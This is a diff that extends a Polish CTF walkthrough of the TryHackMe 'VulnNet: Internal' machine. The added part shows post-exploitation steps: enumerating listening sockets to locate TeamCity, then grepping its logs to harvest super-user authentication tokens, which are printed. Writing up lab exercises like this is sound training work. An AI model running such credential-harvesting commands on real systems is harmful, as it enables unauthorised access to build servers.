@@ -68,6 +68,7 @@ gobuster vhost -u http://ip-10-200-111-33.eu-west-1.compute.internal:80/ -wlist_
 
 
 ## Maszyna [VulnNet: Internal:](https://tryhackme.com/room/vulnnetinternal)
+![Ups...](/screens/v_wstep.jpg)
 
     UWAGA: Adresy IP maszyny atakowanej będą się różnić na zrzutach ekranu gdyż były tworzone podczas krótkich sesii a nie pojedyńczego rozwiązania tego pokoju.
 
@@ -397,4 +398,50 @@ sys-internal@vulnnet-internal:~$ ./LinEnum.sh -r raport.txt -e .
 TeamCity to narzędzie które wspiera budowanie i wdrażanie różnego rodzaju projektów. Po instalacji dostęp do internetowego interfejsu użytkownika TeamCity można uzyskać za pośrednictwem przeglądarki internetowej.
 ```
 ![ups!!!](/screens/v_kat_tc.png)
+Sprawdzenie gniazd sieciowych ujawnia, że ​​usługa jest uruchomiona dla hosta lokalnego na porcie 8111, który jest prawdopodobnie używany przez TeamCity. Sprawdziłem to poleceniem:
+```
+sys-internal@vulnnet-internal:/TeamCity$ ss -ltp
+State              Recv-Q              Send-Q                                   Local Address:Port                                     Peer Address:Port              
+LISTEN             0                   64                                             0.0.0.0:44113                                         0.0.0.0:*                 
+LISTEN             0                   128                                            0.0.0.0:34737                                         0.0.0.0:*                 
+LISTEN             0                   128                                      127.0.0.53%lo:domain                                        0.0.0.0:*                 
+LISTEN             0                   128                                            0.0.0.0:ssh                                           0.0.0.0:*                 
+LISTEN             0                   5                                            127.0.0.1:ipp                                           0.0.0.0:*                 
+LISTEN             0                   50                                             0.0.0.0:microsoft-ds                                  0.0.0.0:*                 
+LISTEN             0                   64                                             0.0.0.0:nfs                                           0.0.0.0:*                 
+LISTEN             0                   128                                            0.0.0.0:57409                                         0.0.0.0:*                 
+LISTEN             0                   128                                            0.0.0.0:38917                                         0.0.0.0:*                 
+LISTEN             0                   5                                              0.0.0.0:rsync                                         0.0.0.0:*                 
+LISTEN             0                   50                                             0.0.0.0:netbios-ssn                                   0.0.0.0:*                 
+LISTEN             0                   128                                            0.0.0.0:6379                                          0.0.0.0:*                 
+LISTEN             0                   128                                            0.0.0.0:sunrpc                                        0.0.0.0:*                 
+LISTEN             0                   64                                                [::]:40625                                            [::]:*                 
+LISTEN             0                   128                                               [::]:ssh                                              [::]:*                 
+LISTEN             0                   5                                                [::1]:ipp                                              [::]:*                 
+LISTEN             0                   50                                  [::ffff:127.0.0.1]:59513                                               *:*                 
+LISTEN             0                   50                                                [::]:microsoft-ds                                     [::]:*                 
+LISTEN             0                   64                                                [::]:nfs                                              [::]:*                 
+LISTEN             0                   50                                                   *:9090                                                *:*                 
+LISTEN             0                   128                                               [::]:43813                                            [::]:*                 
+LISTEN             0                   1                                   [::ffff:127.0.0.1]:8105                                                *:*                 
+LISTEN             0                   128                                               [::]:39337                                            [::]:*                 
+LISTEN             0                   5                                                 [::]:rsync                                            [::]:*                 
+LISTEN             0                   128                                              [::1]:6379                                             [::]:*                 
+LISTEN             0                   50                                                [::]:netbios-ssn                                      [::]:*                 
+LISTEN             0                   50                                                   *:39309                                               *:*                 
+LISTEN             0                   100                                 [::ffff:127.0.0.1]:8111                                                *:*                 
+LISTEN             0                   128                                               [::]:54127                                            [::]:*                 
+LISTEN             0                   128                                               [::]:sunrpc                                           [::]:*                 
+```
+Token do logowania do TeamCity znalazłem za pomocą polecenia:
 
+```
+sys-internal@vulnnet-internal:/TeamCity$ grep -iR token /TeamCity/logs/ 2>/dev/null
+/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 8446629153054945175 (use empty username with the token as the password to access the server)
+/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 8446629153054945175 (use empty username with the token as the password to access the server)
+/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 3782562599667957776 (use empty username with the token as the password to access the server)
+/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 5812627377764625872 (use empty username with the token as the password to access the server)
+/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 6178050210894872888 (use empty username with the token as the password to access the server)
+
+```
+![...](/screens/v_token_tc.png)
